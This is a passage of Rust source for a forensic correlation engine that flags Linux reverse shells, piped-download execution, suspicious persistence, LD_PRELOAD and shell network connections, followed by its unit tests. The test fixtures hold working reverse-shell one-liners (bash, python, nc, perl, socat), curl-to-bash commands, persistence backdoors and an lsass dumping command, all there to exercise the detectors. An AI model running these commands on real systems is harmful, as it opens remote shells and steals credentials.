                            proc_name,
                            gs_num(obs, "pid"),
                            exec_path
                        ),
                    ));
                }
            }

            let mechanism = gs("mechanism");
            if let Some((tech, label)) = linux_persistence_technique(mechanism) {
                let command = if !gs("value_data").is_empty() {
                    gs("value_data")
                } else {
                    gs("action")
                };
                let lower = command.to_lowercase();
                let verdict = if let Some(pattern) = reverse_shell_pattern(&lower, None) {
                    Some((
                        format!("реверс-шелл: {}", pattern),
                        Severity::Critical,
                        95.0,
                    ))
                } else if pipes_download_into_shell(&lower) {
                    Some((
                        "загрузка и исполнение через конвейер в оболочку".to_string(),
                        Severity::High,
                        85.0,
                    ))
                } else {
                    executes_from_world_writable(command).map(|program| {
                        (
                            format!("запуск из общедоступного для записи каталога: {}", program),
                            Severity::High,
                            85.0,
                        )
                    })
                };
                if let Some((why, sev, risk)) = verdict {
                    let item = [gs("item_name"), gs("task_name"), gs("autorun_key")]
                        .into_iter()
                        .find(|s| !s.is_empty())
                        .unwrap_or("");
                    candidate_facts.push(Cand::new(
                        EntityType::Host,
                        format!("{}:persist:{}:{}", host, mechanism, item),
                        "SuspiciousLinuxPersistence",
                        0.90,
                        sev,
                        risk,
                        Some(PainLevel::TTPs),
                        "CORR-LIN-002a",
                        Some(tech),
                        Some("Persistence"),
                        format!(
                            "Подозрительное закрепление через {} ({}): {}",
                            label, why, command
                        ),
                    ));
                }
            }

            if mechanism == "ld_preload" {
                let lib = gs("value_data");
                candidate_facts.push(Cand::new(
                    EntityType::Host,
                    format!("{}:persist:ld_preload:{}", host, lib),
                    "DynamicLinkerPreload",
                    0.85,
                    Severity::High,
                    80.0,
                    Some(PainLevel::HostArtifacts),
                    "CORR-LIN-002b",
                    Some("T1574.006"),
                    Some("Defense Evasion"),
                    format!(
                        "Библиотека принудительно подгружается во все процессы через /etc/ld.so.preload: {}",
                        lib
                    ),
                ));
            }

            if obs.raw_event_type == "network_socket"
                && is_unix_shell(&actor)
                && gs("state").eq_ignore_ascii_case("established")
                && is_external_address(gs("destination_ip"))
            {
                let dest = gs("destination_ip");
                let port = gs_num(obs, "destination_port");
                candidate_facts.push(Cand::new(
                    EntityType::NetworkSocket,
                    format!("{}:{}", dest, port),
                    "ShellNetworkConnection",
                    0.95,
                    Severity::Critical,
                    94.0,
                    Some(PainLevel::NetworkArtifacts),
                    "CORR-LIN-003",
                    Some("T1071"),
                    Some("Command and Control"),
                    format!(
                        "Командная оболочка {} (PID {}) держит установленное соединение с {}:{}",
                        proc_name,
                        gs_num(obs, "owning_pid"),
                        dest,
                        port
                    ),
                ));
            }

            // Aggregate candidate facts into facts vector
            for cand in candidate_facts {
                let lookup_key = (
                    obs.case_id,
                    cand.ent_type,
                    cand.key.clone(),
                    cand.fact.to_string(),
                );

                if let Some(&idx) = fact_indices.get(&lookup_key) {
                    let fact = &mut facts[idx];
                    if !fact.evidence_ids.contains(&obs.id) {
                        fact.evidence_ids.push(obs.id);
                    }
                    if fact.evidence_ids.len() >= 3 {
                        fact.verification_state = VerificationState::Confirmed;
                        fact.confidence = Confidence::new((fact.confidence.value() + 0.1).min(1.0));
                        fact.evidence_strength = (fact.evidence_strength + 0.2).min(1.0);
                    } else if fact.evidence_ids.len() >= 2 {
                        fact.verification_state = VerificationState::Corroborated;
                        fact.confidence =
                            Confidence::new((fact.confidence.value() + 0.08).min(1.0));
                        fact.evidence_strength = (fact.evidence_strength + 0.15).min(1.0);
                    }
                    let obs_time = obs.source_timestamp.unwrap_or(obs.ingest_timestamp);
                    if obs_time < fact.created_at {
                        fact.created_at = obs_time;
                    }
                } else {
                    let idx = facts.len();
                    fact_indices.insert(lookup_key, idx);

                    let mut enriched_data = obs.data.clone();
                    if let Some(obj) = enriched_data.as_object_mut() {
                        obj.insert(
                            "rule_id".to_string(),
                            serde_json::Value::String(cand.rule.to_string()),
                        );
                        obj.insert(
                            "title".to_string(),
                            serde_json::Value::String(cand.desc.clone()),
                        );
                        if let Some(tech) = cand.tech {
                            obj.insert(
                                "mitre_technique".to_string(),
                                serde_json::Value::String(tech.to_string()),
                            );
                        }
                        if let Some(tac) = cand.tac {
                            obj.insert(
                                "mitre_tactic".to_string(),
                                serde_json::Value::String(tac.to_string()),
                            );
                        }
                    }

                    facts.push(Fact {
                        id: EntityId::new_v7(),
                        case_id: obs.case_id,
                        evidence_ids: vec![obs.id],
                        assertion_type: AssertionType::Fact,
                        verification_state: VerificationState::Candidate,
                        entity_type: cand.ent_type,
                        entity_key: cand.key,
                        fact_type: cand.fact.to_string(),
                        confidence: Confidence::new(cand.conf),
                        severity: cand.sev,
                        risk_score: cand.risk,
                        evidence_strength: 0.5,
                        pain_level: cand.pain,
                        data: enriched_data,
                        created_at: obs.source_timestamp.unwrap_or(obs.ingest_timestamp),
                    });
                }
            }
        }

        Ok(facts)
    }
}

impl Default for DeterministicCorrelationEngine {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_test_obs(
        case_id: EntityId,
        tool: &str,
        event_type: &str,
        data: serde_json::Value,
    ) -> Observation {
        Observation {
            id: EntityId::new_v7(),
            case_id,
            artifact_id: None,
            tool_run_id: None,
            source_tool: tool.to_string(),
            raw_event_type: event_type.to_string(),
            source_timestamp: Some(chrono::Utc::now()),
            ingest_timestamp: chrono::Utc::now(),
            data,
            network_quality: None,
            network_provenance: None,
        }
    }

    #[test]
    fn test_credential_dumping_correlation() {
        let engine = DeterministicCorrelationEngine::new();
        let case_id = EntityId::new_v7();
        let data = serde_json::json!({
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "host_ip": "10.0.0.5"
        });
        let obs1 = make_test_obs(case_id, "evtx_parser", "process_create", data.clone());
        let facts1 = engine.correlate(std::slice::from_ref(&obs1)).unwrap();
        assert_eq!(facts1.len(), 1);
        assert_eq!(facts1[0].fact_type, "CredentialAccessAttempt");
        assert_eq!(facts1[0].severity, Severity::Critical);
        assert_eq!(facts1[0].verification_state, VerificationState::Candidate);

        let obs2 = make_test_obs(case_id, "sysmon_parser", "process_create", data);
        let facts2 = engine.correlate(&[obs1, obs2]).unwrap();
        assert_eq!(facts2.len(), 1);
        assert_eq!(
            facts2[0].verification_state,
            VerificationState::Corroborated
        );
        assert!(facts2[0].is_corroborated());
    }

    #[test]
    fn test_detection_rules() {
        let engine = DeterministicCorrelationEngine::new();
        let cid = EntityId::new_v7();

        let obs = make_test_obs(
            cid,
            "win_svc",
            "service",
            serde_json::json!({
                "service_name": "VulnerableAppSvc", "binary_path": "C:\\Program Files\\App\\svc.exe",
                "unquoted_risk": true, "host": "PC-3002"
            }),
        );
        let f = engine.correlate(&[obs]).unwrap();
        assert_eq!(f[0].fact_type, "UnquotedServicePath");
        assert_eq!(f[0].data["rule_id"], "CORR-WIN-004");

        let obs = make_test_obs(
            cid,
            "win_proc",
            "process",
            serde_json::json!({
                "name": "powershell.exe", "parent_name": "WINWORD.EXE", "host": "PC-3002"
            }),
        );
        let f = engine.correlate(&[obs]).unwrap();
        assert_eq!(f[0].fact_type, "OfficeSpawnedShell");
        assert_eq!(f[0].data["rule_id"], "CORR-WIN-001e");

        let obs = make_test_obs(
            cid,
            "win_sock",
            "network_socket",
            serde_json::json!({
                "destination_ip": "198.51.100.42", "destination_port": 4444, "host": "PC-3002"
            }),
        );
        let f = engine.correlate(&[obs]).unwrap();
        assert_eq!(f[0].fact_type, "SuspiciousC2Connection");
        assert_eq!(f[0].data["rule_id"], "CORR-WIN-003a");
    }

    fn linux_obs(event_type: &str, data: serde_json::Value) -> Observation {
        let mut data = data;
        let obj = data.as_object_mut().unwrap();
        obj.insert("platform".into(), serde_json::json!("linux"));
        obj.insert("host".into(), serde_json::json!("srv-lin-01"));
        make_test_obs(EntityId::new_v7(), "linux_collector", event_type, data)
    }

    fn rules_fired(obs: Observation) -> Vec<(String, String, String)> {
        DeterministicCorrelationEngine::new()
            .correlate(&[obs])
            .unwrap()
            .into_iter()
            .map(|f| {
                (
                    f.data["rule_id"].as_str().unwrap().to_string(),
                    f.fact_type.clone(),
                    f.data["mitre_technique"].as_str().unwrap_or("").to_string(),
                )
            })
            .collect()
    }

    fn fired(obs: Observation) -> Vec<String> {
        rules_fired(obs).into_iter().map(|(r, _, _)| r).collect()
    }

    #[test]
    fn linux_reverse_shell_command_line_produces_fact() {
        let obs = linux_obs(
            "process",
            serde_json::json!({
                "process_name": "bash", "pid": 4242, "ppid": 4100,
                "executable_path": "/usr/bin/bash",
                "command_line": "bash -c bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"
            }),
        );
        let facts = DeterministicCorrelationEngine::new()
            .correlate(std::slice::from_ref(&obs))
            .unwrap();
        assert_eq!(facts.len(), 1);
        let f = &facts[0];
        assert_eq!(f.fact_type, "ReverseShellCommandLine");
        assert_eq!(f.data["rule_id"], "CORR-LIN-001a");
        assert_eq!(f.data["mitre_technique"], "T1059.004");
        assert_eq!(f.data["mitre_tactic"], "Execution");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.entity_key, "srv-lin-01:proc:revshell:4242");
        assert_eq!(f.evidence_ids, vec![obs.id]);
    }

    #[test]
    fn linux_reverse_shell_variants() {
        let cases = [
            ("python3", "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0);import pty; pty.spawn(\"/bin/sh\")"),
            ("nc", "nc -e /bin/sh 10.0.0.1 4444"),
            ("ncat", "ncat 10.0.0.1 4444 --sh-exec /bin/bash"),
            ("sh", "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"),
            ("perl", "perl -e use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};"),
            ("socat", "socat tcp-connect:10.0.0.1:4444 exec:/bin/bash,pty,stderr,setsid"),
        ];
        for (name, cmd) in cases {
            let rules = fired(linux_obs(
                "process",
                serde_json::json!({"process_name": name, "pid": 1, "command_line": cmd}),
            ));
            assert!(
                rules.contains(&"CORR-LIN-001a".to_string()),
                "{} => {:?}",
                cmd,
                rules
            );
        }
    }

    #[test]
    fn linux_reverse_shell_text_in_unrelated_process_is_not_a_finding() {
        for (name, cmd) in [
            ("grep", "grep -r /dev/tcp/ /etc"),
            ("vim", "vim notes-about-nc -e-and-python-socket-pty.md"),
            ("bash", "/bin/bash /usr/local/bin/backup.sh --full"),
            ("nc", "nc -zv 10.0.0.1 22"),
            ("python3", "python3 -m http.server 8000"),
        ] {
            let rules = fired(linux_obs(
                "process",
                serde_json::json!({"process_name": name, "pid": 1, "command_line": cmd}),
            ));
            assert!(rules.is_empty(), "{} => {:?}", cmd, rules);
        }
    }

    #[test]
    fn linux_download_piped_to_shell() {
        let rules = rules_fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "sh", "pid": 7,
                "command_line": "sh -c curl -fsSL http://203.0.113.7/x.sh | sudo bash -s"}),
        ));
        assert_eq!(
            rules,
            vec![(
                "CORR-LIN-001d".into(),
                "DownloadPipedToShell".into(),
                "T1105".into()
            )]
        );
        // Downloading to a file is not the piped-execution pattern.
        assert!(fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "sh", "pid": 7,
                "command_line": "sh -c curl -o /var/cache/x.tgz https://example.org/x.tgz | tee log"}),
        ))
        .is_empty());
    }

    #[test]
    fn linux_execution_from_world_writable_dirs() {
        for path in ["/tmp/.x/kworker", "/var/tmp/upd", "/dev/shm/agent"] {
            let rules = rules_fired(linux_obs(
                "process",
                serde_json::json!({"process_name": "kworker", "pid": 9, "executable_path": path}),
            ));
            assert_eq!(
                rules,
                vec![(
                    "CORR-LIN-001b".into(),
                    "ProcessFromWorldWritableDir".into(),
                    "T1036.005".into()
                )],
                "{}",
                path
            );
        }
        assert!(fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "sshd", "pid": 9, "executable_path": "/usr/sbin/sshd"}),
        ))
        .is_empty());
        // "/tmpfoo" is not under /tmp.
        assert!(fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "x", "pid": 9, "executable_path": "/tmpfoo/x"}),
        ))
        .is_empty());
    }

    #[test]
    fn linux_deleted_and_fileless_executables() {
        let engine = DeterministicCorrelationEngine::new();
        let dropped = engine
            .correlate(&[linux_obs(
                "process",
                serde_json::json!({"process_name": "x", "pid": 31, "executable_path": "/home/bob/.cache/x", "exe_deleted": true}),
            )])
            .unwrap();
        assert_eq!(dropped.len(), 1);
        assert_eq!(dropped[0].data["rule_id"], "CORR-LIN-001c");
        assert_eq!(dropped[0].severity, Severity::High);

        let upgraded = engine
            .correlate(&[linux_obs(
                "process",
                serde_json::json!({"process_name": "sshd", "pid": 32, "executable_path": "/usr/sbin/sshd", "exe_deleted": true}),
            )])
            .unwrap();
        assert_eq!(upgraded[0].data["rule_id"], "CORR-LIN-001c");
        assert_eq!(upgraded[0].severity, Severity::Medium);

        let memfd = rules_fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "6", "pid": 79, "executable_path": "/memfd:payload", "exe_deleted": true}),
        ));
        assert_eq!(
            memfd,
            vec![(
                "CORR-LIN-001e".into(),
                "FilelessMemfdExecution".into(),
                "T1620".into()
            )]
        );

        let tmp_deleted = fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "x", "pid": 33, "executable_path": "/tmp/x", "exe_deleted": true}),
        ));
        assert_eq!(tmp_deleted, vec!["CORR-LIN-001b", "CORR-LIN-001c"]);
    }

    #[test]
    fn linux_persistence_rules() {
        let cron = rules_fired(linux_obs(
            "scheduled_task",
            serde_json::json!({"task_name": "backdoor:1", "mechanism": "cron",
                "action": "nohup /var/tmp/.cache/kworker -c /var/tmp/.cache/cfg >/dev/null 2>&1"}),
        ));
        assert_eq!(
            cron,
            vec![(
                "CORR-LIN-002a".into(),
                "SuspiciousLinuxPersistence".into(),
                "T1053.003".into()
            )]
        );

        let unit = rules_fired(linux_obs(
            "autorun",
            serde_json::json!({"item_name": "evil.service", "mechanism": "systemd_service",
                "value_data": "/dev/shm/.k/agent --daemon", "target_path": "/dev/shm/.k/agent"}),
        ));
        assert_eq!(unit[0].2, "T1543.002");

        let engine = DeterministicCorrelationEngine::new();
        let rc = engine
            .correlate(&[linux_obs(
                "autorun",
                serde_json::json!({"item_name": "line 3", "mechanism": "rc_local",
                    "value_data": "bash -c 'bash -i >& /dev/tcp/198.51.100.9/443 0>&1' &"}),
            )])
            .unwrap();
        assert_eq!(rc[0].data["mitre_technique"], "T1037.004");
        assert_eq!(rc[0].severity, Severity::Critical);

        let xdg = rules_fired(linux_obs(
            "autorun",
            serde_json::json!({"item_name": "Updater", "mechanism": "xdg_autostart",
                "value_data": "curl -s http://203.0.113.7/p | bash"}),
        ));
        assert_eq!(xdg[0].2, "T1547.013");

        let timer = rules_fired(linux_obs(
            "scheduled_task",
            serde_json::json!({"task_name": "x.timer", "mechanism": "systemd_timer",
                "action": "/bin/sh /tmp/.t/run.sh"}),
        ));
        assert_eq!(timer[0].2, "T1053.006");

        let preload = rules_fired(linux_obs(
            "autorun",
            serde_json::json!({"item_name": "/usr/lib/libprocesshider.so", "mechanism": "ld_preload",
                "value_data": "/usr/lib/libprocesshider.so"}),
        ));
        assert_eq!(
            preload,
            vec![(
                "CORR-LIN-002b".into(),
                "DynamicLinkerPreload".into(),
                "T1574.006".into()
            )]
        );

        // Ordinary distribution entries, including ones that merely touch /tmp.
        for (mechanism, command) in [
            ("cron", "cd / && run-parts --report /etc/cron.hourly"),
            ("cron", "find /tmp -type f -mtime +7 -delete"),
            ("cron", "rm -rf /tmp/php-sessions/*"),
            ("cron_periodic", "/etc/cron.daily/apt-compat"),
            (
                "systemd_service",
                "/usr/bin/redis-server /etc/redis/redis.conf --supervised systemd",
            ),
            ("systemd_timer", "/usr/lib/apt/apt.systemd.daily install"),
        ] {
            let rules = fired(linux_obs(
                "scheduled_task",
                serde_json::json!({"task_name": "t", "mechanism": mechanism, "action": command}),
            ));
            assert!(rules.is_empty(), "{} => {:?}", command, rules);
        }
    }

    #[test]
    fn linux_shell_with_external_connection() {
        let sock = |state: &str, dest: &str, name: &str| {
            linux_obs(
                "network_socket",
                serde_json::json!({"process_name": name, "owning_pid": 4242, "state": state,
                    "destination_ip": dest, "destination_port": 443, "local_port": 51000}),
            )
        };
        assert_eq!(
            rules_fired(sock("Established", "198.51.100.9", "bash")),
            vec![(
                "CORR-LIN-003".into(),
                "ShellNetworkConnection".into(),
                "T1071".into()
            )]
        );
        assert!(fired(sock("Established", "127.0.0.1", "bash")).is_empty());
        assert!(fired(sock("Established", "::ffff:127.0.0.1", "bash")).is_empty());
        assert!(fired(sock("Listen", "0.0.0.0", "bash")).is_empty());
        assert!(fired(sock("Established", "198.51.100.9", "curl")).is_empty());
    }

    #[test]
    fn powershell_encoded_rule_is_scoped_to_powershell_on_linux() {
        // A Linux process whose arguments merely contain "-enc".
        assert!(fired(linux_obs(
            "process",
            serde_json::json!({"process_name": "ffmpeg", "pid": 5,
                "command_line": "ffmpeg -i in.mp4 -encoder libx264 out.mp4"}),
        ))
        .is_empty());
        // PowerShell on Linux is still covered...
        assert_eq!(
            fired(linux_obs(
                "process",
                serde_json::json!({"process_name": "pwsh", "pid": 5,
                    "command_line": "pwsh -enc SQBFAFgA"}),
            )),
            vec!["CORR-WIN-001d"]
        );
        // ...and observations without a platform (EVTX, Sysmon) are unchanged.
        let evtx = make_test_obs(
            EntityId::new_v7(),
            "evtx_parser",
            "process_create",
            serde_json::json!({"command_line": "powershell.exe -enc SQBFAFgA", "host": "PC"}),
        );
        assert_eq!(fired(evtx), vec!["CORR-WIN-001d"]);
    }

    fn make_phase4_obs(
        case_id: EntityId,
        event_type: &str,
        timestamp: chrono::DateTime<chrono::Utc>,
        data: serde_json::Value,
    ) -> Observation {
        Observation {
            id: EntityId::new_v7(),
            case_id,
            artifact_id: Some(EntityId::new_v7()),
            tool_run_id: None,
            source_tool: if event_type == "process_create" {
                "sysmon_parser".to_string()
            } else {
                "pcap_parser".to_string()
            },
            raw_event_type: event_type.to_string(),
            source_timestamp: Some(timestamp),
            ingest_timestamp: timestamp + chrono::Duration::seconds(1),
            data,
            network_quality: if event_type == "process_create" {
                None
            } else {
                Some(core_domain::NetworkObservationQuality {
                    capture: core_domain::CaptureQuality::Complete,
                    flow: Some(core_domain::FlowQuality::Complete),
                    protocol: Some(core_domain::ProtocolQuality::Complete),
                })
            },
            network_provenance: None,
        }
    }

    #[test]
    fn corr_h01_evtx_pcap_is_batch_independent() {
        let case_id = EntityId::new_v7();
        let base = chrono::Utc::now();
        let observations = vec![
            make_phase4_obs(
                case_id,
                "process_create",
                base,
                serde_json::json!({"host": "WS-01", "process_name": "powershell.exe"}),
            ),
            make_phase4_obs(
                case_id,
                "dns_message",
                base + chrono::Duration::seconds(10),
                serde_json::json!({"host": "WS-01", "qname": "example.test"}),
            ),
            make_phase4_obs(
                case_id,
                "tls_handshake",
                base + chrono::Duration::seconds(20),
                serde_json::json!({"host": "WS-01", "sni": "example.test"}),
            ),
            make_phase4_obs(
                case_id,
                "dns_message",
                base + chrono::Duration::seconds(30),
                serde_json::json!({"host": "WS-01", "qname": "noise.test"}),
            ),
        ];
        let results_128 = correlate_in_batches(&observations, 128).unwrap();
        let results_512 = correlate_in_batches(&observations, 512).unwrap();
        let results_2048 = correlate_in_batches(&observations, 2048).unwrap();
        assert_eq!(results_128, results_512);
        assert_eq!(results_512, results_2048);
        assert_eq!(results_128.len(), 1);
        assert_eq!(results_128[0].rule_id, "CORR-H01-EVTX-PCAP");
        assert_eq!(
            results_128[0].provenance.matched_domain.as_deref(),
            Some("example.test")
        );
        assert_eq!(results_128[0].supporting_observations.len(), 3);
        assert_eq!(results_128[0].assertion_type, AssertionType::Inference);
        assert_eq!(
            results_128[0].verification_state,
            VerificationState::Candidate
        );
    }

    #[test]
    fn corr_h01_quality_is_conservative() {
        let case_id = EntityId::new_v7();
        let base = chrono::Utc::now();
        let mut process = make_phase4_obs(
            case_id,
            "process_create",
            base,
            serde_json::json!({"host": "WS-01", "process_name": "powershell.exe"}),
        );
        process.network_quality = Some(core_domain::NetworkObservationQuality {
            capture: core_domain::CaptureQuality::Complete,
            flow: None,
            protocol: Some(core_domain::ProtocolQuality::Degraded),
        });
        let observations = vec![
            process,
            make_phase4_obs(
                case_id,
                "dns_message",
                base + chrono::Duration::seconds(1),
                serde_json::json!({"host": "WS-01", "qname": "example.test"}),
            ),
            make_phase4_obs(
                case_id,
                "tls_handshake",
                base + chrono::Duration::seconds(2),
                serde_json::json!({"host": "WS-01", "sni": "example.test"}),
            ),
        ];
        let result = correlate_in_batches(&observations, 1).unwrap();
        assert_eq!(result[0].provenance.quality, CorrelationQuality::Degraded);
        assert_eq!(result[0].confidence, 50);
    }

    #[test]
    fn corr_h01_requires_explicit_host_attribution() {
        let case_id = EntityId::new_v7();
        let base = chrono::Utc::now();
        let mut observations = vec![
            make_phase4_obs(
                case_id,
                "process_create",
                base,
                serde_json::json!({"host": "WS-01", "process_name": "powershell.exe"}),
            ),
            make_phase4_obs(
                case_id,
                "dns_message",
                base + chrono::Duration::seconds(1),
                serde_json::json!({"qname": "example.test"}),
            ),
            make_phase4_obs(
                case_id,
                "tls_handshake",
                base + chrono::Duration::seconds(2),
                serde_json::json!({"sni": "example.test"}),
            ),
        ];
        assert!(correlate_in_batches(&observations, 128).unwrap().is_empty());

        observations[1]
            .data
            .as_object_mut()
            .unwrap()
            .insert("host".to_string(), serde_json::json!("WS-01"));
        observations[2]
            .data
            .as_object_mut()
            .unwrap()
            .insert("host".to_string(), serde_json::json!("WS-01"));
        assert_eq!(correlate_in_batches(&observations, 128).unwrap().len(), 1);
    }

    #[test]
    fn corr_h01_does_not_use_ingest_time_for_missing_source_time() {
        let case_id = EntityId::new_v7();
        let ingest_time = chrono::Utc::now();
        let mut process = make_phase4_obs(
            case_id,
            "process_create",
            ingest_time,
            serde_json::json!({"host": "WS-01", "process_name": "powershell.exe"}),
        );
        process.source_timestamp = None;
        process.ingest_timestamp = ingest_time;
        let observations = vec![
            process,
            make_phase4_obs(
                case_id,
                "dns_message",
                ingest_time,
                serde_json::json!({"host": "WS-01", "qname": "example.test"}),
            ),
            make_phase4_obs(
                case_id,
                "tls_handshake",
                ingest_time,
                serde_json::json!({"host": "WS-01", "sni": "example.test"}),
            ),
        ];
        assert!(correlate_in_batches(&observations, 128).unwrap().is_empty());
    }

    #[test]
    fn corr_h01_temporal_window_is_inclusive_and_deterministic() {
        let case_id = EntityId::new_v7();
        let base = chrono::Utc::now();
        let process = make_phase4_obs(
            case_id,
            "process_create",
            base,
            serde_json::json!({"host": "WS-01", "process_name": "powershell.exe"}),
        );
        let dns = make_phase4_obs(
            case_id,
            "dns_message",
            base + chrono::Duration::seconds(300),
            serde_json::json!({"host": "WS-01", "qname": "example.test"}),
        );
        let tls = make_phase4_obs(
            case_id,
            "tls_handshake",
            base + chrono::Duration::seconds(300),
            serde_json::json!({"host": "WS-01", "sni": "example.test"}),
        );
        assert_eq!(
            correlate_in_batches(&[process.clone(), dns, tls], 128)
                .unwrap()
                .len(),
            1
        );

        let late_tls = make_phase4_obs(
            case_id,
            "tls_handshake",
            base + chrono::Duration::seconds(302),
            serde_json::json!({"host": "WS-01", "sni": "example.test"}),
        );
        let late_dns = make_phase4_obs(
            case_id,
            "dns_message",
            base + chrono::Duration::seconds(301),
            serde_json::json!({"host": "WS-01", "qname": "example.test"}),
        );
        assert!(correlate_in_batches(&[process, late_dns, late_tls], 128)
            .unwrap()
            .is_empty());
    }
}
